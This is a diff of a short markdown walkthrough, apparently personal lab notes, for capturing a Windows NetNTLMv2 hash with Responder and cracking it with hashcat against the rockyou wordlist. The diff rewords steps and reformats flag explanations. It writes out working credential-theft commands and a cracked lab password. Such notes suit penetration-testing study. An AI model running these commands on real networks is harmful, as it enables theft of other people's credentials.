@@ -3,7 +3,8 @@
 ### 1. Set up responder
 **sudo responder -I eth0 -dwv**
 *we are now listening for traffic*
-### 2. Go to one of the windows machines - I logged on as fcastle and point it at your attacker machine
+### 2. Go to one of the windows machines and point it at your attacker machine
+**effectively search for the attack machines ip to create a log entry**
 *this will not resolve but should let us pull down the hash*
 
 ### 3. Use hashcat on the hash
@@ -13,8 +14,8 @@
 	3. crack the hash 
 	4. hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt.gz --force
 Explanation:
--m 5600 → NetNTLMv2
--a 0 → dictionary attack
---force → needed sometimes in VM environments
+-**m 5600** = NetNTLMv2
+-**a 0** = dictionary attack
+-**--force** = needed sometimes in VM environments
 
 *Attack Complete: Password1!*
